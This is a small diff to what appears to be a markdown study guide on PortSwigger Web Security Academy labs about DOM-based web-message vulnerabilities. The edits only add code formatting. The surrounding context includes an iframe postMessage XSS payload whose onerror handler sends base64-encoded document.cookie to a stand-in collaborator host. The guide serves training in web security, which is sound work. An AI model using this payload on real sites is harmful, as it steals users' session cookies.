@@ -253,7 +253,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
->***Identify*** web messages on target that is using **postmessage()** with **DOM Invader**.  
+>***Identify*** web messages on target that is using `postmessage()` with **DOM Invader**.  
 
 ```JavaScript
 <script>
@@ -337,7 +337,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![Source code web message ads](images/source-code-web-message-ads.png)  
 
->The ```fetch``` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the postMessage() method sends a web message to their home page.  
+>The ```fetch``` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the `postMessage()` method sends a web message to their home page.  
 
 ```html
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
